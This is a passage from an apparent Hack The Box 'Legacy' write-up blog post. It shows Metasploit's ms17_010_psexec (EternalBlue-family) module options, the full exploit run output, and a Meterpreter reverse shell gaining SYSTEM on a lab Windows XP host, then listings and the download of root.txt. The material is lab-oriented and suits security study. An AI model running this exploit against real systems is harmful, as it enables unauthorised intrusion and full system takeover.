   LEAKATTEMPTS          <span style=color:#bd93f9>99</span>                                                                           yes       How many <span style=color:#8be9fd;font-style:italic>times</span> to try to leak transaction
   NAMEDPIPE                                                                                          no        A named pipe that can be connected to <span style=color:#ff79c6>(</span>leave blank <span style=color:#ff79c6>for</span> auto<span style=color:#ff79c6>)</span>
   NAMED_PIPES           /opt/metasploit-framework/embedded/framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                10.10.10.4                                                                   yes       The target host<span style=color:#ff79c6>(</span>s<span style=color:#ff79c6>)</span>, range CIDR identifier, or hosts file with syntax <span style=color:#f1fa8c>&#39;file:&lt;path&gt;&#39;</span>
   RPORT                 <span style=color:#bd93f9>445</span>                                                                          yes       The Target port
   SERVICE_DESCRIPTION                                                                                no        Service description to to be used on target <span style=color:#ff79c6>for</span> pretty listing
   SERVICE_DISPLAY_NAME                                                                               no        The service display name
   SERVICE_NAME                                                                                       no        The service name
   SHARE                 ADMIN$                                                                       yes       The share to connect to, can be an admin share <span style=color:#ff79c6>(</span>ADMIN$,C$,...<span style=color:#ff79c6>)</span> or a normal read/write folder share
   SMBDomain             .                                                                            no        The Windows domain to use <span style=color:#ff79c6>for</span> authentication
   SMBPass                                                                                            no        The password <span style=color:#ff79c6>for</span> the specified username
   SMBUser                                                                                            no        The username to authenticate as


Exploit target:

   Id  Name
   --  ----
   <span style=color:#bd93f9>0</span>   Automatic


msf5 exploit<span style=color:#ff79c6>(</span>windows/smb/ms17_010_psexec<span style=color:#ff79c6>)</span> &gt; run

<span style=color:#ff79c6>[</span>-<span style=color:#ff79c6>]</span> Handler failed to <span style=color:#8be9fd;font-style:italic>bind</span> to 10.10.14.36:8000:-  -
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Started reverse TCP handler on 0.0.0.0:8000
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - Target OS: Windows 5.1
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - Filling barrel with fish... <span style=color:#ff79c6>done</span>
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - 	<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Preparing dynamite...
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - 		<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Trying stick <span style=color:#bd93f9>1</span> <span style=color:#ff79c6>(</span>x86<span style=color:#ff79c6>)</span>...Boom!
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - 	<span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> Successfully Leaked Transaction!
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - 	<span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> Successfully caught Fish-in-a-barrel
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81e11010
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - Built a write-what-where primitive...
<span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - Selecting native target
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - Uploading payload... iJRKhIQV.exe
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - Created <span style=color:#f1fa8c>\i</span>JRKhIQV.exe...
<span style=color:#ff79c6>[</span>+<span style=color:#ff79c6>]</span> 10.10.10.4:445 - Service started successfully...
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Sending stage <span style=color:#ff79c6>(</span><span style=color:#bd93f9>180291</span> bytes<span style=color:#ff79c6>)</span> to 192.168.99.1
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Meterpreter session <span style=color:#bd93f9>1</span> opened <span style=color:#ff79c6>(</span>172.17.0.2:8000 -&gt; 192.168.99.1:52467<span style=color:#ff79c6>)</span> at 2020-02-21 06:24:42 +0000
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> 10.10.10.4:445 - Deleting <span style=color:#f1fa8c>\i</span>JRKhIQV.exe...

meterpreter &gt; dir C:
Listing: C:
<span style=color:#ff79c6>===========</span>

Mode                Size               Type  Last modified                    Name
----                ----               ----  -------------                    ----
100777/rwxrwxrwx    <span style=color:#bd93f9>0</span>                  fil   2017-03-16 05:30:44 +0000        AUTOEXEC.BAT
100666/rw-rw-rw-    <span style=color:#bd93f9>0</span>                  fil   2017-03-16 05:30:44 +0000        CONFIG.SYS
40777/rwxrwxrwx     <span style=color:#bd93f9>0</span>                  dir   2017-03-16 05:20:29 +0000        Documents and Settings
100444/r--r--r--    <span style=color:#bd93f9>0</span>                  fil   2017-03-16 05:30:44 +0000        IO.SYS
100444/r--r--r--    <span style=color:#bd93f9>0</span>                  fil   2017-03-16 05:30:44 +0000        MSDOS.SYS
100555/r-xr-xr-x    <span style=color:#bd93f9>47564</span>              fil   2008-04-13 20:13:04 +0000        NTDETECT.COM
40555/r-xr-xr-x     <span style=color:#bd93f9>0</span>                  dir   2017-03-16 05:20:57 +0000        Program Files
40777/rwxrwxrwx     <span style=color:#bd93f9>0</span>                  dir   2017-03-16 05:20:30 +0000        System Volume Information
40777/rwxrwxrwx     <span style=color:#bd93f9>0</span>                  dir   2017-03-16 05:18:34 +0000        WINDOWS
100666/rw-rw-rw-    <span style=color:#bd93f9>211</span>                fil   2017-03-16 05:20:02 +0000        boot.ini
100444/r--r--r--    <span style=color:#bd93f9>250048</span>             fil   2008-04-13 22:01:44 +0000        ntldr
60411620/rw--w----  <span style=color:#bd93f9>48691528838709232</span>  fif   1551977431-11-16 03:18:24 +0000  pagefile.sys

meterpreter &gt; dir <span style=color:#f1fa8c>&#34;C:\Documents and Settings&#34;</span>
Listing: C:<span style=color:#f1fa8c>\D</span>ocuments and <span style=color:#8be9fd;font-style:italic>Settings</span>
<span style=color:#ff79c6>==================================</span>

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  <span style=color:#bd93f9>0</span>     dir   2017-03-16 06:07:20 +0000  Administrator
40777/rwxrwxrwx  <span style=color:#bd93f9>0</span>     dir   2017-03-16 05:20:29 +0000  All Users
40777/rwxrwxrwx  <span style=color:#bd93f9>0</span>     dir   2017-03-16 05:20:29 +0000  Default User
40777/rwxrwxrwx  <span style=color:#bd93f9>0</span>     dir   2017-03-16 05:32:52 +0000  LocalService
40777/rwxrwxrwx  <span style=color:#bd93f9>0</span>     dir   2017-03-16 05:32:42 +0000  NetworkService
40777/rwxrwxrwx  <span style=color:#bd93f9>0</span>     dir   2017-03-16 05:33:41 +0000  john

meterpreter &gt; getuid
Server username: NT AUTHORITY<span style=color:#f1fa8c>\S</span>YSTEM
meterpreter &gt; dir <span style=color:#f1fa8c>&#34;C:\Documents and Settings\Administrator\Desktop&#34;</span>
Listing: C:<span style=color:#f1fa8c>\D</span>ocuments and Settings<span style=color:#f1fa8c>\A</span>dministrator<span style=color:#f1fa8c>\D</span>esktop
<span style=color:#ff79c6>========================================================</span>

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  <span style=color:#bd93f9>32</span>    fil   2017-03-16 06:18:19 +0000  root.txt

meterpreter &gt; cat  <span style=color:#f1fa8c>&#34;C:\Documents and Settings\john\Desktop\user.txt&#34;</span>
meterpreter &gt; download <span style=color:#f1fa8c>&#34;C:\Documents and Settings\Administrator\Desktop\root.txt&#34;</span>
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Downloading: C:<span style=color:#f1fa8c>\D</span>ocuments and Settings<span style=color:#f1fa8c>\A</span>dministrator<span style=color:#f1fa8c>\D</span>esktop<span style=color:#f1fa8c>\r</span>oot.txt -&gt; root.txt
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> Downloaded 32.00 B of 32.00 B <span style=color:#ff79c6>(</span>100.0%<span style=color:#ff79c6>)</span>: C:<span style=color:#f1fa8c>\D</span>ocuments and Settings<span style=color:#f1fa8c>\A</span>dministrator<span style=color:#f1fa8c>\D</span>esktop<span style=color:#f1fa8c>\r</span>oot.txt -&gt; root.txt
<span style=color:#ff79c6>[</span>*<span style=color:#ff79c6>]</span> download   : C:<span style=color:#f1fa8c>\D</span>ocuments and Settings<span style=color:#f1fa8c>\A</span>dministrator<span style=color:#f1fa8c>\D</span>esktop<span style=color:#f1fa8c>\r</span>oot.txt -&gt; root.txt

</code></pre></td></tr></table>
</div>
</div>
</div>
</article>
<hr>
<div class=sharing-buttons>
<a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f" target=_blank rel=noopener aria-label title="Share on facebook">
<div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f" target=_blank rel=noopener aria-label title="Share on twitter">
<div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://www.tumblr.com/widgets/share/tool?posttype=link&title=HTB%20-%20Legacy&caption=HTB%20-%20Legacy&canonicalUrl=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f" target=_blank rel=noopener aria-label title="Share on tumblr">
<div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="mailto:?subject=HTB%20-%20Legacy&body=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f" target=_self rel=noopener aria-label title="Share via email">
<div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f&media=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f;description=HTB%20-%20Legacy" target=_blank rel=noopener aria-label title="Share on pinterest">
<div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f&title=HTB%20-%20Legacy&summary=HTB%20-%20Legacy&source=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f" target=_blank rel=noopener aria-label title="Share on linkedin">
<div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f&resubmit=true&title=HTB%20-%20Legacy" target=_blank rel=noopener aria-label title="Share on reddit">
<div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f;title=HTB%20-%20Legacy" target=_blank rel=noopener aria-label title="Share on xing">
<div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="whatsapp://send?text=HTB%20-%20Legacy%20https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f" target=_blank rel=noopener aria-label title="Share on whatsapp">
<div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f&t=HTB%20-%20Legacy" target=_blank rel=noopener aria-label title="Share on hacker news">
<div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
</div>
</div>
</a>
<a class=resp-sharing-button__link href="https://telegram.me/share/url?text=HTB%20-%20Legacy&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2020%2f04%2fhtb-legacy%2f" target=_blank rel=noopener aria-label title="Share on telegram">
<div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
</div>
</div>
</a>
</div>
<hr>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h></span>
</div>
<div class=pagination__buttons>
<a href=https://0xade1.github.io/posts/2020/04/htb-popcorm/ class="button previous">
<span class=button__icon>←</span>
<span class=button__text>HTB - Popcorm</span>
</a>
<a href=https://0xade1.github.io/posts/2020/04/htb-lame/ class="button next">
<span class=button__text>HTB - Lame</span>
<span class=button__icon>→</span>
</a>
</div>
</div>
<hr>
</main>
</div>
<footer class=footer>
<div class=footer__inner>
<div class=footer__content>
<span>&copy; 2021</span>
<span><a href=https://0xade1.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
</div>
</div>
<div class=footer__inner>
<div class=footer__content>
<span>Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>Made with &#10084;</span>
</div>
</div>
</footer>
</div>
<script type=text/javascript src=https://0xade1.github.io/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5+q9hMmUsWWGa7+YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE+kyEg=="></script>
</body>
</html>